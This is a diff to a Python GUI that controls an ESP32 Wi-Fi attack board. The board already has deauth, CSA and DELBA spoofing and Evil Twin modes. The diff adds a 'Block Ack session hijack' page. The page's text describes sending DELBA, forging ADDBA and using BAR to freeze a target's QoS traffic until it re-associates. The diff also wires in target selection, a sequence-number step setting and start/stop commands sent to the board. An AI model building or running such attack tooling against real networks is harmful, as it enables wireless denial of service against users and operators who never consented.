@@ -48,6 +48,7 @@ MENU = [
     ("probe", "Probe 攻击"),
     ("csa", "CSA 欺骗"),
     ("delba", "DELBA 欺骗"),
+    ("ba", "BA 会话攻击"),
     ("evil", "Evil Twin"),
     ("status", "设备状态"),
     ("log", "日志"),
@@ -60,6 +61,8 @@ DEAUTH_MODES = [
     ("only", "只打勾选", True, "白名单：只打弹窗里勾选的 AP"),
     ("except", "排除勾选", True, "黑名单：打全部 AP，但排除弹窗里勾选的"),
 ]
+
+BA_STEPS = ["512", "256", "1024", "2047", "0 (对照：不推窗口)"]
 
 DELBA_REASONS = [
     "37 - 不再使用该机制",
@@ -317,6 +320,8 @@ class DeautherApp:
         self.csa_label = None
         self.delba_reason_var = tk.StringVar(value=DELBA_REASONS[0])
         self.delba_label = None
+        self.ba_step_var = tk.StringVar(value=BA_STEPS[0])
+        self.ba_label = None
 
         root.title("ESP32 Wireless Attack 上位机")
         root.geometry("1040x700")
@@ -375,6 +380,7 @@ class DeautherApp:
         self.pages["probe"] = self._build_probe_page()
         self.pages["csa"] = self._build_csa_page()
         self.pages["delba"] = self._build_delba_page()
+        self.pages["ba"] = self._build_ba_page()
         self.pages["evil"] = self._build_evil_page()
         self.pages["status"] = self._build_status_page()
         self.pages["log"] = self._build_log_page()
@@ -570,6 +576,55 @@ class DeautherApp:
                   "还没听到客户端时退化为广播 DELBA；\n"
                   "• 客户端重新建会话（ADDBA）会被再拆一次，所以链路会一直“连着但很慢”；\n"
                   "• 底栏 DELBA 字段：on/off、帧数 delbaf、客户端数 delbac、TID 位图 delbat。"),
+            justify="left",
+        ).pack(anchor="w", pady=(12, 0))
+        return page
+
+    def _build_ba_page(self):
+        page = self._make_page()
+        ttk.Label(page, text="BA 会话攻击（Block Ack 会话劫持）", font=("", 12, "bold")).pack(
+            anchor="w", pady=(10, 4))
+        ttk.Label(
+            page,
+            text="DELBA 清场 → 伪造 ADDBA（用我们给的 SSN 种植接收窗口）→ BAR 把窗口顶在真实序列号前面。"
+                 "目标不断连，但那个 TID 的 QoS 数据会卡死，多数实现要重新关联才恢复。",
+            foreground="#777777", wraplength=900, justify="left",
+        ).pack(anchor="w", pady=(0, 8))
+
+        bar = ttk.Frame(page)
+        bar.pack(fill="x", pady=(0, 6))
+        btn = ttk.Button(bar, text="扫描 AP", width=11, command=self.scan, state="disabled")
+        btn.pack(side="left")
+        self.scan_btns["ba"] = btn
+        tbtn = ttk.Button(bar, text="选择目标…", width=13,
+                          command=lambda: self.open_targets(False), state="disabled")
+        tbtn.pack(side="left", padx=6)
+        self.target_btns["ba"] = tbtn
+        self.ba_label = ttk.Label(bar, text="未扫描")
+        self.ba_label.pack(side="left", padx=10)
+
+        params = ttk.Frame(page)
+        params.pack(fill="x", pady=(4, 6))
+        ttk.Label(params, text="SN 步进：").pack(side="left")
+        ttk.Combobox(params, textvariable=self.ba_step_var, values=BA_STEPS,
+                     state="readonly", width=18).pack(side="left")
+        ttk.Label(params, text="   （把窗口顶到真实序列号前面多少帧；0–127 是对照组）",
+                  foreground="#555555").pack(side="left")
+
+        actions = ttk.Frame(page)
+        actions.pack(fill="x", pady=(6, 4))
+        ttk.Button(actions, text="开始 BA 攻击", width=14,
+                   command=self.start_ba).pack(side="left")
+        ttk.Button(actions, text="停止", width=10, command=self.ba_stop).pack(side="left", padx=8)
+
+        ttk.Label(
+            page,
+            text=("说明：\n"
+                  "• 选一个 AP，攻击板会停到它的信道上；\n"
+                  "• 先按 QoS 数据帧/ADDBA 学到客户端与 TID，再按 TID 双向伪造；\n"
+                  "• 底栏 BA 字段：on/off、ADDBA 帧数、BAR 帧数、DELBA 帧数、最后写入的 SSN；\n"
+                  "• 实验室结论：只发 2 帧伪造 ADDBA 就能让该 TID 冻结且不自愈（需重新关联），\n"
+                  "  但“窗口被推走”这一步还没单独证明（需要 mac80211 目标）。"),
             justify="left",
         ).pack(anchor="w", pady=(12, 0))
         return page
@@ -897,6 +952,29 @@ class DeautherApp:
     def delba_stop(self):
         self._send("DELBASTOP")
 
+    def start_ba(self):
+        if not self._require_link():
+            return
+        if not self.networks:
+            messagebox.showinfo("提示", "先点“扫描 AP”。")
+            return
+        if self.single_index is None:
+            messagebox.showerror("BA 参数无效", "先在“选择目标…”里选一个 AP。")
+            return
+        step = self.ba_step_var.get().split(" ")[0]
+        try:
+            value = int(step)
+        except ValueError:
+            messagebox.showerror("BA 参数无效", "SN 步进必须是 0–2047 的整数。")
+            return
+        if value < 0 or value > 2047:
+            messagebox.showerror("BA 参数无效", "SN 步进必须在 0–2047 之间。")
+            return
+        self._send(f"BAATTACK {self.single_index} {value}")
+
+    def ba_stop(self):
+        self._send("BASTOP")
+
     def stop(self):
         self._send("STOP")
 
@@ -968,6 +1046,8 @@ class DeautherApp:
                 f"reason：{payload.get('reason', '-')}    CSA：{payload.get('csa', '-')} "
                 f"({payload.get('csaf', '-')} 帧)    DELBA：{payload.get('delba', '-')} "
                 f"({payload.get('delbaf', '-')} 帧 / TID {payload.get('delbat', '-')})    "
+                f"BA：{'on' if payload.get('bamode') == '1' else 'off'} "
+                f"({payload.get('babar', '-')} BAR / SSN {payload.get('bassn', '-')})    "
                 f"网络：{payload.get('networks', '-')}"
                 f"    堆：{payload.get('heap', '-')}{band_hint}"
             )
@@ -975,7 +1055,8 @@ class DeautherApp:
             self.status_text.delete("1.0", "end")
             for key in ("mode", "eliminated", "deauth_frames", "probe_frames", "networks", "creds",
                         "heap", "ui", "caps", "ch", "rx", "rxm",
-                        "delba", "delbaf", "delbac", "delbat", "delbab", "delbar", "delbtr"):
+                        "delba", "delbaf", "delbac", "delbat", "delbab", "delbar", "delbtr",
+                        "bamode", "baaddba", "babar", "badlba", "bassn", "baerr", "baplant"):
                 if key in payload:
                     self.status_text.insert("end", f"{key:<14}{payload[key]}\n")
             self.status_text.configure(state="disabled")
